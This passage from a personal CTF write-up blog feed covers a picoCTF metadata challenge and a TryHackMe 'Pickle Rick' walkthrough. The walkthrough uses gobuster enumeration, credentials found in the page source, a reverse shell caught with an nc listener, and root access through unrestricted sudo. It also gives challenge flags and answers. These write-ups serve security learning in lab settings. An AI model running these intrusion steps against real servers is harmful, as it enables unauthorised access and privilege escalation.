</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/pico<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>└─$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>ukn_reality.jpg  unknown.zip</span></span></code></pre></div>
<br>
<p>Inside the zip file, there was a <code>.jpg</code> file named ukn_reality.jpg and it looked like the following:</p>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<p>Since this was the only file given to me, I knew I had to look up the file&rsquo;s info to capture the flag. So the first thing I tried was to run a <code>file</code> command. However, nothing useful was found.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/pico<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ file ukn_reality.jpg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>ukn_reality.jpg: JPEG image data, JFIF standard 1.01, resolution <span style="color:#89dceb;font-weight:bold">(</span>DPI<span style="color:#89dceb;font-weight:bold">)</span>, density 72x72, segment length 16, baseline, precision 8, 4308x2875, components <span style="color:#fab387">3</span></span></span></code></pre></div>
<br>
<p>Then I asked chatGPT for ways to view information about an image and it provided some commonly used methods:</p>
<ol>
<li><code>file</code> command</li>
<li><code>identify</code> from ImageMagick</li>
<li><code>exiftool</code></li>
<li><code>exiv2</code></li>
</ol>
<p>I further looked into the commands and thought the <code>exiftool</code> would give me the most information about the image.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/pico<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ exiftool ukn_reality.jpg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>File Name                       : ukn_reality.jpg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Directory                       : .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>File Size                       : 2.3 MB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>File Modification Date/Time     : 2024:03:11 20:05:51-04:00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>File Access Date/Time           : 2024:07:09 16:33:57-04:00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>File Inode Change Date/Time     : 2024:07:09 16:33:51-04:00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>File Type                       : JPEG
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>File Type Extension             : jpg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>MIME Type                       : image/jpeg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>JFIF Version                    : 1.01
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Resolution Unit                 : inches
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>X Resolution                    : <span style="color:#fab387">72</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>Y Resolution                    : <span style="color:#fab387">72</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>XMP Toolkit                     : Image::ExifTool 11.88
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>Attribution URL                 : <span style="color:#f5e0dc">cGljb0NURntNRTc0RDQ3QV9ISUREM05fM2I5MjA5YTJ9Cg</span><span style="color:#89dceb;font-weight:bold">==</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>Image Width                     : <span style="color:#fab387">4308</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>Image Height                    : <span style="color:#fab387">2875</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>Encoding Process                : Baseline DCT, Huffman coding
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>Bits Per Sample                 : <span style="color:#fab387">8</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>Color Components                : <span style="color:#fab387">3</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>Y Cb Cr Sub Sampling            : YCbCr4:2:0 <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">2</span> 2<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>Image Size                      : 4308x2875
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>Megapixels                      : 12.4</span></span></code></pre></div>
<br>
<p>If you look closely the value for <code>Attribution URL</code> is not in the expected form. It looks like it&rsquo;s encoded or hashed. I tried decoding the given URL with the <code>base64</code> command.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/pico<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ <span style="color:#89dceb">echo</span> <span style="color:#f5e0dc">cGljb0NURntNRTc0RDQ3QV9ISUREM05fM2I5MjA5YTJ9Cg</span><span style="color:#89dceb;font-weight:bold">==</span> | base64 -d
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>picoCTF<span style="color:#89dceb;font-weight:bold">{</span>ME74D47A_HIDD3N_3b9209a2<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<p>And we got the flag!</p>
<p><strong><em>flag</em></strong>: <code>picoCTF{ME74D47A_HIDD3N_3b9209a2}</code></p>
]]></content:encoded>
    </item>
    <item>
      <title>[THM] Pickle Rick</title>
      <link>http://localhost:1313/thm-pickle-rick/</link>
      <pubDate>Tue, 09 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/thm-pickle-rick/</guid>
      <description>This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.
Deploy the virtual machine on this task and explore the web application
What is the first ingredient that Rick needs? mr. meeseek hair The first enumeration step I took was to run a nmap scan. In the meanwhile, I browsed the source code of the target website and found the following: username: R1ckRul3s, which implies that there&amp;rsquo;s going to be some sort of login webpage within the target website.</description>
      <content:encoded><![CDATA[<p>This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.</p>
<p>Deploy the virtual machine on this task and explore the web application</p>
<h4 id="what-is-the-first-ingredient-that-rick-needs">What is the first ingredient that Rick needs?</h4>






<pre tabindex="0"><code>mr. meeseek hair</code></pre>
<br>
<p>The first enumeration step I took was to run a nmap scan. In the meanwhile, I browsed the source code of the target website and found the following: <code>username: R1ckRul3s</code>, which implies that there&rsquo;s going to be some sort of login webpage within the target website.</p>
<p><img src="image.png#center" alt="alt text"></p>
<p>Through the nmap scan, I confirmed there&rsquo;s 2 open ports: 1 ssh and 1 http server. The next thing I did was to run a <code>gobuster</code> to brute-force against the target URL and to find directories and files using a wordlist. Also I appended <code>-x</code> option, this means that Gobuster will test each directory/file name with the given extensions.</p>
<p><code>gobuster dir -u http://10.10.243.38 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,css,txt,db,js,py</code></p>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<p>gobuster ouput gave me some useful information. Let&rsquo;s take a look at the <code>robot.txt</code> file first. The robot.txt file only contained <code>Wubbalubbadubdub</code>, which could be a password for the username we found earlier.</p>
<p><img src="image-2.png#center" alt="alt text">
<br></p>
<p>To test my theory, I navigated to <code>/login.php</code> url and inputted the username, R1ckRul3s and the password, Wubbalubbadubdub. It turned out they were the correct credentials and the site directed me to <code>/portal.php</code></p>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<p>I typed <code>ls</code> command then got the following result. Then I tried <code>cat Sup3rS3cretPickl3Ingred.txt</code> but it said &ldquo;command disabled&rdquo;, so I navigated to /Sup3rS3cretPickl3Ingred.txt and got <code>mr. meeseek hair</code>, which turned out to be the first ingredient of the task!
<img src="image-4.png#center" alt="alt text"></p>
<p><img src="image-5.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-the-second-ingredient-in-ricks-potion">What is the second ingredient in Rick&rsquo;s potion?</h4>






<pre tabindex="0"><code>1 jerry tear</code></pre>
<br>
<p>Since we can execute some of the commands on the target website. I think it&rsquo;s best to try reverse-shell. I visited the <code>pentest monkey</code> to refer to their <strong>Reverse Shell Cheat Sheet</strong> for Python reverse shell. Make sure to change the IP address to your own and change the <code>python</code> to <code>python3</code>.</p>
<p><img src="image-7.png#center" alt="alt text"></p>
<p><img src="image-9.png#center" alt="alt text"></p>
<br>
Before running the reverse-shell command, I made sure I'm running the netcat in order to capture the shell.






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ nc -lvnp <span style="color:#fab387">1234</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">1234</span> ...</span></span></code></pre></div>
<br>
<p>I was able to caputre the shell after I had executed the python reverse shell command.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nc -lvnp <span style="color:#fab387">1234</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">1234</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.6.67.243<span style="color:#89dceb;font-weight:bold">]</span> from <span style="color:#89dceb;font-weight:bold">(</span>UNKNOWN<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>10.10.242.29<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">38160</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>/bin/sh: 0: can<span style="color:#f38ba8">&#39;</span>t access tty; job control turned off
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Sup3rS3cretPickl3Ingred.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>assets
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>clue.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>denied.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>index.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>login.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>portal.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>robots.txt</span></span></code></pre></div>
<br>
<p>I remembered there was <code>clue.txt</code> file which showed me a hint for the second ingredient.</p>
<p><img src="image-6.png" alt="alt text"></p>
<br>
<p>I looked around the file system in the shell for a while then I finally found the file named <code>second ingredients</code>!</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>$ <span style="color:#89dceb">cd</span> home
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>rick
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>ubuntu
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>$ <span style="color:#89dceb">cd</span> rick
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>second ingredients
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>$ ls -la
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>total <span style="color:#fab387">12</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>drwxrwxrwx <span style="color:#fab387">2</span> root root <span style="color:#fab387">4096</span> Feb <span style="color:#fab387">10</span>  <span style="color:#fab387">2019</span> .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>drwxr-xr-x <span style="color:#fab387">4</span> root root <span style="color:#fab387">4096</span> Feb <span style="color:#fab387">10</span>  <span style="color:#fab387">2019</span> ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>-rwxrwxrwx <span style="color:#fab387">1</span> root root   <span style="color:#fab387">13</span> Feb <span style="color:#fab387">10</span>  <span style="color:#fab387">2019</span> second ingredients
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>$ cat <span style="color:#a6e3a1">&#34;second ingredients&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#fab387">1</span> jerry tear</span></span></code></pre></div>
<br>
<h4 id="what-is-the-last-and-final-ingredient">What is the last and final ingredient?</h4>






<pre tabindex="0"><code>fleeb juice</code></pre>
<br>
<p>After we got the second flag, while still in the shell we captured, I ran <code>sudo -l</code> command to see what commands I&rsquo;m permitted to run using <code>sudo</code> and it turned out there was no restriction at all.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>$ sudo -l
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Matching Defaults entries <span style="color:#cba6f7">for</span> www-data on ip-10-10-242-29:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>    <span style="color:#f5e0dc">secure_path</span><span style="color:#89dceb;font-weight:bold">=</span>/usr/local/sbin<span style="color:#89b4fa">\:</span>/usr/local/bin<span style="color:#89b4fa">\:</span>/usr/sbin<span style="color:#89b4fa">\:</span>/usr/bin<span style="color:#89b4fa">\:</span>/sbin<span style="color:#89b4fa">\:</span>/bin<span style="color:#89b4fa">\:</span>/snap/bin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>User www-data may run the following commands on ip-10-10-242-29:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>    <span style="color:#89dceb;font-weight:bold">(</span>ALL<span style="color:#89dceb;font-weight:bold">)</span> NOPASSWD: ALL</span></span></code></pre></div>
<br>
<p>Because I knew that I could run any command with sudo, I went straight to run the <code>sudo bash</code> command. This command runs a new instance of Bash shell with root privileges. This effectively gives you a root shell. Once I got the root priviliege, the rest was easy. I navigated to the <code>root</code> folder and there was the third ingredients inside it.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>proc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>sbin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>snap
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>srv
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>sys
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>tmp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>usr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>var
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>vmlinuz
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>vmlinuz.old
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb">cd</span> root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>3rd.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>snap
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>cat 3rd.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>3rd ingredients: fleeb juice</span></span></code></pre></div>
<p>I got the last ingredients for this task!</p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] packer</title>
      <link>http://localhost:1313/picoctf-packer/</link>
      <pubDate>Mon, 08 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-packer/</guid>
      <description>Description Reverse this linux executable?
First, I downloaded the file to my local machine using the wget comand.
wget https://artifacts.picoctf.net/c_titan/103/out
It seems like a binary file that contains non-human readable contents inside it
1┌──(kali㉿kali)-[~/Desktop] 2└─$ ls 3hello.php5 hello.png leewookb.ovpn out shell.js 4 5┌──(kali㉿kali)-[~/Desktop] 6└─$ file out 7out: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header I used the strings command to extract and print only the readable strings from the binary file and found these words that might be useful.</description>
      <content:encoded><![CDATA[<h3 id="description">Description</h3>
<p>Reverse this linux executable?</p>
<hr>
<p>First, I downloaded the file to my local machine using the <strong>wget</strong> comand.</p>
<p><code>wget https://artifacts.picoctf.net/c_titan/103/out</code></p>
<p>It seems like a binary file that contains non-human readable contents inside it</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ ls
